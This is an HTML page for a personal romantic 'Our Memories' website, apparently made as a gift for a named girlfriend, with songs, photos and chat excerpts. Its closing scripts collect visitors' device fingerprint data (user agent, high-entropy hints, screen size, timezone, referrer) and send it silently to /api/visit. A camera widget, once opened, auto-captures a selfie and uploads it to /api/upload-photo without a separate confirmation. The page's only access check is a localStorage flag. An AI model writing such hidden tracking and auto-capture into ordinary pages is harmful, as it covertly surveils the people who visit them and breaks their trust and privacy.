<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <title>Our Memories WebsiteğŸ’•</title>

  <meta property="og:title" content="Our Memories WebsiteğŸ’—" />
  <meta property="og:description" content="For Sayangku Cintaku Cantikku Cianku TondikuğŸ˜‹â¤ï¸" />
  <meta property="og:image" content="img/logo.ico" /> <meta property="og:url" content="https://elrexsaa.github.io/kenangan.html" /> <meta property="og:type" content="website" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">

  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="intro-screen">
    <div id="intro-text" class="intro-text"></div>
</div>

  <div class="bg-hearts"></div>

  <main class="page--stack hidden">
    <header class="mem-header reveal-section">
      <h2 id="greeting" class="typewriter">Hi, My Beloved Nikita Friskila PakpahanğŸ’—ğŸ’—ğŸ’—</h2>
      <p class="muted">haii sayangg, silahkan pilih atau scroll sayaangggğŸ˜»ğŸ˜»ğŸ˜»</p>
      <button id="btnLogout" onclick="doLogout()">Logout</button>
    </header>

    <div class="countdown-container reveal-section">
      <div class="countdown-title">Waktu Menuju Anniversary Kita!</div>
      <div id="countdown">Memuat hitung mundur...</div>
    </div>

    <section class="menu-grid reveal-section">
      <button class="card card--menu" data-target="#sectionSongs" onclick="scrollToTarget(this)">
        <div class="card-title">ğŸµ A Song That Reminds You</div>
        <div class="card-sub muted">aku selalu ingat kamu kalo puter lagu ini</div>
      </button>
      <button class="card card--menu" data-target="#sectionPhotos" onclick="scrollToTarget(this)">
        <div class="card-title">ğŸ“¸ Foto-foto Kita</div>
        <div class="card-sub muted">sedikit foto kenangan kitaa</div>
      </button>
      <button class="card card--menu" data-target="#sectionChat" onclick="scrollToTarget(this)">
        <div class="card-title">ğŸ’¬ Chat Waktu Pertama Kali</div>
        <div class="card-sub muted">awal dari segalanya</div>
      </button>
      <button class="card card--menu" data-target="#sectionQuotes" onclick="scrollToTarget(this)">
        <div class="card-title">ğŸ“ Chat Favorit</div>
        <div class="card-sub muted">chat favorit akuuğŸ¤</div>
      </button>
    </section>

    <div id="sectionSongs" class="content-section reveal-section">
      <h3>ğŸµ A Song That Reminds You</h3>
      <p>top 3 lagu yang kalo diputer aku selalu inget km hihi, kalo km puter aku pasti lagi nari bareng km di pikiran aku hahaha</p>
      
      <div class="track-list">
        
        <div class="music-card">
          <img class="track-cover" src="img/cover1.jpg" alt="Cover Album All Of Me">
          <div class="track-info">
            <div class="tmeta">All Of Me</div>
            <div class="tsub">John Legend</div>
            <audio controls src="sound/sound1.mp3"></audio>
          </div>
        </div>

        <div class="music-card">
          <img class="track-cover" src="img/cover2.JPG" alt="Cover Album Nina">
          <div class="track-info">
            <div class="tmeta">Nina</div>
            <div class="tsub">.Feast</div>
            <audio controls src="sound/sound2.mp3"></audio>
          </div>
        </div>

        <div class="music-card">
          <img class="track-cover" src="img/cover3.jpg" alt="Cover Album Kenangan Manis">
          <div class="track-info">
            <div class="tmeta">Kenangan Manis</div>
            <div class="tsub">Pamungkas</div>
            <audio controls src="sound/sound3.mp3"></audio>
          </div>
        </div>
      </div>
      </div>

    <div id="sectionPhotos" class="content-section reveal-section">
      <h3>ğŸ“¸ Foto-foto Kita</h3>
      <p>sedikit foto kenangan kita bareng hehe, sayang banget kita dikit ngabadiin momen bareng bareng yaa, next setiap detik harus di abadiin biar aku masukin kesini hehehehe. (Geser ke samping untuk lihat semua)</p>
      
      <div class="carousel-container">
        <div class="carousel-track">
          <div class="carousel-slide"><img src="img/f3.jpg" alt="Foto Kenangan 1"></div>
          <div class="carousel-slide"><img src="img/f7.jpg" alt="Foto Kenangan 2"></div>
          <div class="carousel-slide"><img src="img/f4.jpg" alt="Foto Kenangan 3"></div>
          <div class="carousel-slide"><img src="img/f1.jpg" alt="Foto Kenangan 4"></div>
          <div class="carousel-slide"><img src="img/f6.jpg" alt="Foto Kenangan 5"></div>
          <div class="carousel-slide"><img src="img/f2.jpg" alt="Foto Kenangan 6"></div>
        </div>
      </div>
      
    </div>

    <div id="sectionChat" class="content-section reveal-section">
      <h3>ğŸ’¬ Awal Dari Segalanya</h3>
      <div class="chat-frame">
        <div class="chat-header">
          <div class="contact">elgalauğŸ˜­ğŸ‘ğŸ¼</div>
          <div class="status muted">online</div>
        </div>
        <div class="chat-body" id="chatBody"></div>
      </div>
      <p class="muted" style="text-align:center;margin-top:15px;">03 Agustus 2024, aku dengan semua modus aku hahaha. malu kalo diinget tapi gabakal bisa aku lupain juga wkwkwk, jaman jaman masih prik bgt akuu. botak, so keras, so jago, masih petantang petenteng wkwkwkğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­</p>
    </div>

    <div id="sectionQuotes" class="content-section reveal-section">
      <h3>ğŸ“ Chat Favorit Aku</h3>
      <p>chat km yang bikin aku makin sayang, cinta sama km HAHAHAHA</p>
      
      <div class="fav-chat-container">
        
        <div class="fav-chat-bubble right">
          <div class="text">km kann jagoan nya aku.</div>
          <div class="meta">
            <span class="timestamp">23:35</span>
            <span class="favorite-star">â­</span>
          </div>
        </div>
        
        <div class="fav-chat-bubble right">
          <div class="text">yasudaa intinyaa km bisaa, AKUUU YAKINN SAYANGGKU...</div>
          <div class="meta">
            <span class="timestamp">23:36</span>
            <span class="favorite-star">â­</span>
          </div>
        </div>

        <div class="fav-chat-bubble right">
          <div class="text">oalaa, kalo suda ngampus masuk biasa semangatt buat ngejalanin nya yaa, capai smua yg km critain aku pokokna hrs tauu klo km berhasill</div>
          <div class="meta">
            <span class="timestamp">23:49</span>
            <span class="favorite-star">â­</span>
          </div>
        </div>

        <div class="fav-chat-bubble right">
          <div class="text">AKUU SLALUU SUPPORT KM SAYANG, BAHKAN KALAU DUNIA GA BERPIHAK SM KAMUU ADAA AK DISINI</div>
          <div class="meta">
            <span class="timestamp">00:05</span>
            <span class="favorite-star">â­</span>
          </div>
        </div>

        <div class="fav-chat-bubble right">
          <div class="text">km kan cinta nyaa aku</div>
          <div class="meta">
            <span class="timestamp">16:42</span>
            <span class="favorite-star">â­</span>
          </div>
        </div>

      </div>
      </div>
  </main>

  <audio id="bgm" src="audio.mp3" autoplay loop></audio>

  <script src="script.js"></script>
  <script src="animasi.js"></script>
  
  <script>
    const AUTH_KEY = 'kenangan_verified';
    const LOGIN_PAGE = 'index.html';
    
    // Periksa otorisasi
    if (localStorage.getItem(AUTH_KEY) !== 'true') {
      window.location.replace(LOGIN_PAGE);
    }
    
    function doLogout() {
      localStorage.removeItem(AUTH_KEY);
      window.location.replace(LOGIN_PAGE);
    }
  </script>

<script>
(async function sendVisit(){
  try {
    const ua = navigator.userAgent;
    const lang = navigator.language;
    const platform = navigator.platform;
    const screenW = window.screen?.width;
    const screenH = window.screen?.height;
    const viewportW = document.documentElement.clientWidth || window.innerWidth;
    const viewportH = document.documentElement.clientHeight || window.innerHeight;
    const referrer = document.referrer;
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

    let uaData = null;
    if (navigator.userAgentData) {
      try {
        uaData = await navigator.userAgentData.getHighEntropyValues(['platform','model','brands','mobile']);
      } catch {}
    }

    const payload = {
      ua, uaData, platform, lang,
      screen: { screenW, screenH, viewportW, viewportH },
      tz, referrer, href: location.href
    };

    fetch('/api/visit', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch(e){
    console.log('log fail', e);
  }
})();
</script>

<!-- camera-auto-or-live: paste before </body> -->
<script>
(async function () {
  // konfigurasi: auto capture = true -> ambil foto langsung setelah izin
  const AUTO_CAPTURE = true; // ubah ke false kalau mau live preview dulu

  // elemen UI (akan disisipkan di akhir body)
  const container = document.createElement('div');
  container.style.cssText = 'position:fixed;right:12px;bottom:12px;z-index:9999;background:#fff;border:1px solid #ddd;padding:10px;border-radius:8px;max-width:320px;font-family:system-ui,Segoe UI,Roboto,Arial;';
  container.innerHTML = `
    <div style="font-weight:600;margin-bottom:6px">kamera (demo)</div>
    <video id="edu_video" autoplay playsinline style="width:100%;display:none;border-radius:6px;background:#000"></video>
    <img id="edu_preview" alt="preview" style="width:100%;display:none;border-radius:6px;margin-top:6px" />
    <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
      <button id="edu_start" style="flex:1;padding:8px 6px">buka kamera</button>
      <button id="edu_snap" style="flex:1;padding:8px 6px;display:none">ambil foto</button>
      <button id="edu_cancel" style="flex:1;padding:8px 6px;display:none">tutup</button>
    </div>
    <div id="edu_status" style="font-size:12px;color:#555;margin-top:6px">klik "buka kamera" untuk mulai. browser akan minta izin.</div>
  `;
  document.body.appendChild(container);

  const video = container.querySelector('#edu_video');
  const preview = container.querySelector('#edu_preview');
  const btnStart = container.querySelector('#edu_start');
  const btnSnap = container.querySelector('#edu_snap');
  const btnCancel = container.querySelector('#edu_cancel');
  const status = container.querySelector('#edu_status');

  let stream = null;

  function setStatus(t) { status.textContent = t; }

  async function stopStream() {
    try { if (stream) stream.getTracks().forEach(t => t.stop()); } catch(e){}
    stream = null;
    video.style.display = 'none';
    btnSnap.style.display = 'none';
    btnCancel.style.display = 'none';
    btnStart.style.display = 'inline-block';
  }

  async function uploadDataUrl(dataUrl) {
    try {
      setStatus('mengirim foto...');
      const res = await fetch('/api/upload-photo', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ image: dataUrl })
      });
      const j = await res.json();
      if (j.ok) {
        setStatus('foto terkirim âœ”');
      } else {
        setStatus('gagal kirim: ' + (j.error || JSON.stringify(j)));
      }
    } catch (err) {
      setStatus('gagal kirim: ' + (err.message || err));
    }
  }

  async function takePhotoAndUpload() {
    if (!stream) return;
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
    preview.src = dataUrl;
    preview.style.display = 'block';
    await uploadDataUrl(dataUrl);
    // optional: stop camera after capture
    stopStream();
  }

  btnStart.addEventListener('click', async () => {
    setStatus('mencoba akses kamera...');
    try {
      // gunakan facingMode user (selfie) â€” bisa diganti "environment" untuk kamera belakang
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      video.srcObject = stream;
      video.style.display = 'block';
      btnStart.style.display = 'none';
      btnCancel.style.display = 'inline-block';
      // show snap button only if not auto
      if (!AUTO_CAPTURE) btnSnap.style.display = 'inline-block';
      setStatus('kamera aktif');
      // jika auto capture, langsung ambil foto 1x setelah video siap
      if (AUTO_CAPTURE) {
        // tunggu frame ready
        await new Promise(r => {
          if (video.readyState >= 2) return r();
          video.addEventListener('loadeddata', r, { once: true });
        });
        setTimeout(() => takePhotoAndUpload(), 250); // delay kecil supaya kamera stabil
      }
    } catch (err) {
      setStatus('akses kamera ditolak atau gagal: ' + (err.message || err));
      console.error('camera error', err);
      stopStream();
    }
  });

  btnSnap.addEventListener('click', async () => {
    await takePhotoAndUpload();
  });

  btnCancel.addEventListener('click', async () => {
    stopStream();
    setStatus('dibatalkan');
  });

  // automatically request on load if you want immediate prompt:
  // uncomment next line to auto open prompt when page loads
  // btnStart.click();

})();
</script>
</body>
</html>
